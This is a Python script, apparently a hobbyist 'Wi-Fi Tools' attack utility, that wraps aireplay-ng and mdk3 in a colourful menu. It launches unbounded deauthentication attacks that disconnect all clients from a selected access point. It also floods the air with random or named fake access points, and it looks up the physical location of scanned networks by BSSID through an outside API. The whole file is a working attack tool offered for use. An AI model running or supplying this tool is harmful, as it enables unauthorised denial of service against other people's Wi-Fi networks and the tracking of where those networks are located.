#!/bin/python3
import wifi
from wifi import Cell, Scheme
import os
from terminaltables import SingleTable
from sty import fg
import sys
from sys import stdout
from time import sleep
import netifaces
import subprocess
import requests

version = "0.1"

def exit_in_3secs():
    print("\n[{0}+{1}] Exitting is 3 secs...".format(fg.li_green, fg.li_white))
    try:
        sleep(3)
    except:
        exit()
    exit()

def StartAPScan(iface, action):
    print("[" + fg.li_green + "+" + fg.li_white + "] " + "Scanning all Wi-Fi Networks...\n")
    os.system("iwconfig " + iface + " mode Managed")
    try:
        list = Cell.all(iface)
    except Exception as e:
        print("\nCatched Exception!")
        print(e)
        exit_in_3secs()

    num = 0
    wifilist = []
    if action == 2:
        wifitable = [
            ["SSID", "ENC", "POWER", "LAT, LON"]
        ]
    else:
        wifitable = [
            ["ID", "SSID", "ENC", "POWER"]
        ]

    for cell in list:
        #print(str(num) + ". " + cell.ssid)
        num = num + 1
        wifilist.append(cell)

        signalstrength = 100 - abs(cell.signal)

        if abs(cell.signal) <= 59:
            signalw = fg.li_green + str(signalstrength) + fg.li_white
        elif abs(cell.signal) <= 75 and abs(cell.signal) >= 59:
            signalw = fg.li_yellow + str(signalstrength) + fg.li_white
        elif abs(cell.signal) >= 75:
            signalw = fg.li_red + str(signalstrength) + fg.li_white

        if cell.encrypted == True:
            enctype = cell.encryption_type
        else:
            enctype = "OPN"
        if action == 2:
            out = requests.get("http://api.mylnikov.org/geolocation/wifi?bssid=" + cell.address).json()
            latlon = str(out['data']['lat']) + " " + str(out['data']['lon'])
            wifitemplate = [cell.ssid, enctype.upper(), signalw, latlon]
        else:
            wifitemplate = [num, cell.ssid, enctype.upper(), signalw]
        wifitable.append(wifitemplate)

    wifitable = SingleTable(wifitable)
    number_of_aps = len(wifilist)
    wifitable.title = str(number_of_aps) + " APs Found"
    if action == 2:
        wifitable.justify_columns[0] = "left"
        wifitable.justify_columns[1] = "center"
    else:
        wifitable.justify_columns[0] = "center"
        wifitable.justify_columns[1] = "left"
    wifitable.justify_columns[2] = "center"
    wifitable.justify_columns[3] = "center"
    wifitable.outer_border = False
    wifitable.inner_column_border = False
    wifitable.padding_left = 4
    wifitable.padding_right = 4

    print(wifitable.table)

    def ask_ap_selected():
        global ap_selected
        ap_selected = input("\n[{0}+{1}]".format(fg.li_green, fg.li_white) + " Choose one of scanned Wi-Fi Networks ({0}1 {1}- {2}{3}{4}) > ".format(fg.li_green, fg.li_white,fg.li_green , number_of_aps, fg.li_white))
        try:
            ap_selected = int(ap_selected)
        except:
            print("[" + fg.li_red + "-" + fg.li_white + "] " + "Wrong number!\n")
            ask_ap_selected()
        ap_selected = ap_selected - 1
        print("[" + fg.li_green + "+" + fg.li_white + "] " + "Selected {0}{1} {2}{3}[{4}]{5}".format(fg.li_green, wifilist[ap_selected].ssid, fg.li_white,fg.blue , wifilist[ap_selected].address, fg.li_white))

        if int(ap_selected) > number_of_aps:
            print("[" + fg.li_red + "-" + fg.li_white + "] " + "Wrong number!\n")
            ask_ap_selected()
    if action == 1:
        try:
            ask_ap_selected()
        except:
            exit_in_3secs()
        print("[" + fg.li_green + "+" + fg.li_white + "] [{0}AIREPLAY-NG{1}] {0}Deauthentication{1} initializing...".format(fg.li_green, fg.li_white))
        #Init deauth
        def deauth(iface, bssid):
            subprocess.call("aireplay-ng -0 0 -a {0} {1}".format(bssid, iface), shell=True, stdout=subprocess.PIPE)
        try:
            print("[" + fg.li_green + "+" + fg.li_white +"] Changing " + fg.li_green + iface + fg.li_white + " channel to " + fg.li_green + str(wifilist[ap_selected].channel) + fg.li_white)
            os.system("iwconfig {0} mode Monitor".format(iface))
            os.system("iwconfig {0} channel {1}".format(iface, wifilist[ap_selected].channel))
            print("[" + fg.li_green + "+" + fg.li_white + "] [{0}AIREPLAY-NG{1}] {0}Deauthentication{1} started... {0}Ctrl{1}+{0}C{1} to Cancel".format(fg.li_green, fg.li_white))
            deauth(iface, wifilist[ap_selected].address)

        except KeyboardInterrupt:
            print(fg.li_green, "\nDone.", fg.li_white)
            exit_in_3secs()
    elif action == 2:
        print(fg.li_green, "\nDone.", fg.li_white)
        exit_in_3secs()


def RandomFlooding(iface, channel, secured):
    print("[" + fg.li_green + "+" + fg.li_white + "] [{0}MDK3{1}] {0}Random Beacon Flooding{1} on {0}{2}{1} channel started... {0}Ctrl{1}+{0}C{1} to Cancel".format(fg.li_green, fg.li_white, channel))
    try:
        subprocess.call("mdk3 {0} b {1} -s 360".format(iface, secured), shell=True, stdout=subprocess.PIPE)
    except:
        print(fg.li_green, "\nDone.", fg.li_white)
        exit_in_3secs()

def SSIDSpecifiedFlooding(iface, channel, secured):
    print("[{0}+{1}] Enter your {0}SSID{1} names (Must be unique). Ctrl+{0}C{1} to stop.".format(fg.li_green, fg.li_white))
    try:
        f = open("/tmp/wifitools.ssid", "w")
        while True:
            SSIDInput = input("{0}>{1}".format(fg.li_green, fg.li_white))
            f.write(SSIDInput + "\n")
    except KeyboardInterrupt:
        f.close()
    print("\n[" + fg.li_green + "+" + fg.li_white + "] [{0}MDK3{1}] {0}SSID Specified Beacon Flooding{1} on {0}{2}{1} channel started... {0}Ctrl{1}+{0}C{1} to Cancel".format(fg.li_green, fg.li_white, channel))
    try:
        subprocess.call("mdk3 {0} b {1} -f /tmp/wifitools.ssid -s 360".format(iface, secured), shell=True, stdout=subprocess.PIPE)
    except:
        print(fg.li_green, "\nDone.", fg.li_white)
        exit_in_3secs()

def Beacon_Flooding(iface):
    bf_menu = [
        [fg.li_green + "1" + fg.li_white, "Random - Generate random FakeAPs"],
        [fg.li_green + "2" + fg.li_white, "SSID specified - Use specified SSIDs"]
    ]
    bf_menu = SingleTable(bf_menu)
    bf_menu.outer_border = False
    bf_menu.inner_row_border = False
    print(fg.li_green + "\nTypes of Beacon Flooding" + fg.li_white)
    print(bf_menu.table)

    def AskFlooding():
        global bf_selected
        global channel_selected
        global secured
        try:
            bf_selected = input("\n[{0}+{1}]".format(fg.li_green, fg.li_white) + " Choose Beacon Flooding Type ({0}1 {1}- {2}{3}{4}) > ".format(fg.li_green, fg.li_white,fg.li_green , "2", fg.li_white))
            channel_selected = input("\n[{0}+{1}]".format(fg.li_green, fg.li_white) + " Choose Beacon Flooding {0}Channel{1} > ".format(fg.li_green, fg.li_white))
            print("[" + fg.li_green + "+" + fg.li_white +"] Changing " + fg.li_green + iface + fg.li_white + " channel to " + fg.li_green + channel_selected + fg.li_white)
            os.system("iwconfig {0} mode Monitor".format(iface))
            os.system("iwconfig {0} channel {1}".format(iface, channel_selected))
            secured = input("\n[{0}+{1}]".format(fg.li_green, fg.li_white) + " Make APs Secured? [{0}Y{1}/{0}n{1}] > ".format(fg.li_green, fg.li_white))
            if secured.lower() == "n":
                secured = ""
                print("[" + fg.li_green + "+" + fg.li_white +"] {0}Disabling{1} Secure APs".format(fg.li_red, fg.li_white))
            else:
                secured = "-a"
                print("[" + fg.li_green + "+" + fg.li_white +"] {0}Enabling{1} Secure APs".format(fg.li_green, fg.li_white))
        except:
            exit_in_3secs()
        try:
            bf_selected = int(bf_selected)
        except:
            print("[" + fg.li_red + "-" + fg.li_white + "] Chosen wrong type of Beacon Flooding!\n")
            AskFlooding()

    AskFlooding()
    if bf_selected == 1:
        RandomFlooding(iface, channel_selected, secured)
    if bf_selected == 2:
        SSIDSpecifiedFlooding(iface, channel_selected, secured)


#windowrows, windowcolumns = os.popen('stty size', 'r').read().split()

os.system("clear")
print(fg.li_green + """
██╗    ██╗██╗███████╗██╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
██║    ██║██║██╔════╝██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
██║ █╗ ██║██║█████╗  ██║       ██║   ██║   ██║██║   ██║██║     ███████╗
██║███╗██║██║██╔══╝  ██║       ██║   ██║   ██║██║   ██║██║     ╚════██║
╚███╔███╔╝██║██║     ██║       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝

""" + fg.li_white)
print("{0}{2}{1} by {0}AlexSSD7{1}\n".format(fg.li_green, fg.li_white, version))


iface_menu = [
    ["ID", "Name"]
]


#Parse wireless adapters
wifaces = []

for ifaces in netifaces.interfaces():
    if ifaces == "lo":
        pass
    elif "eth" in ifaces:
        pass
    else:
        wifaces.append(ifaces)

def get_iface():
    global iface
    global iface_menu
    global wifaces
    num = 0

    for ifaces in wifaces:
        num = num + 1
        iface_menu.append([num, fg.li_green + ifaces + fg.li_white])


    iface_menu = SingleTable(iface_menu)
    iface_menu.outer_border = False
    iface_menu.justify_columns[0] = "center"

    for x in list(iface_menu.justify_columns):
        iface_menu.justify_columns[x + 1] = "center"
    print(iface_menu.table)

    try:
        iface = input("\n[" + fg.li_green + "-" + fg.li_white + "] Which interface to use? ({0}1 {1}- {2}{3}{4}) > ".format(fg.li_green, fg.li_white,fg.li_green , len(wifaces), fg.li_white))
        try:
            iface = int(iface)
        except:
            print("[" + fg.li_red + "-" + fg.li_white + "] Chosen wrong interface!\n")
            exit_in_3secs()
        try:
            iface = wifaces[iface - 1]
        except:
            print("[" + fg.li_red + "-" + fg.li_white + "] Chosen wrong interface!\n")
            exit_in_3secs()
    except KeyboardInterrupt:
        exit_in_3secs()

if len(wifaces) == 1:
    iface = wifaces[0]
    print("[" + fg.li_green + "+" + fg.li_white + "] Automatically chosing " + iface + "...\n")
elif len(wifaces) == 0:
    print("[" + fg.li_red + "-" + fg.li_white + "] No wireless interfaces available!\n")
    exit_in_3secs()
else:
    get_iface()

print("[" + fg.li_green + "+" + fg.li_white + "] " + iface + " accepted!\n")
print("[" + fg.li_green + "+" + fg.li_white + "] Initializing...")
os.system("airmon-ng check kill")
os.system("rfkill unblock 1")

menu_table = [
    [fg.li_green + "1" + fg.li_white, "Deauthentication Attack - prevent all Wi-Fi clients disconnect from AP"],
    [fg.li_green + "2" + fg.li_white, "Beacon flood - spam with fake APs"],
    [fg.li_green + "3" + fg.li_white, "Get location of AP - get location by BSSID"]
]

menu_table = SingleTable(menu_table)
menu_table.outer_border = False
menu_table.inner_row_border = True
print(fg.li_green + "Types of Wi-Fi Attacks" + fg.li_white)
print(menu_table.table)

def askAttack():
    global attack_selected
    try:
        attack_selected = input("\n[{0}+{1}]".format(fg.li_green, fg.li_white) + " Choose Wi-Fi Attack ({0}1 {1}- {2}{3}{4}) > ".format(fg.li_green, fg.li_white,fg.li_green , "2", fg.li_white))
    except:
        exit_in_3secs()
    try:
        attack_selected = int(attack_selected)
    except:
        print("[" + fg.li_red + "-" + fg.li_white + "] Chosen wrong type of attack!\n")
        askAttack()

askAttack()

if attack_selected == 1:
    StartAPScan(iface, 1)
elif attack_selected == 2:
    Beacon_Flooding(iface)
elif attack_selected == 3:
    StartAPScan(iface, 2)



#print("Which do you want to use? (1 - {0})".format(num - 1))
#wifinum = input(">")
#print(wifilist[int(wifinum)].signal)
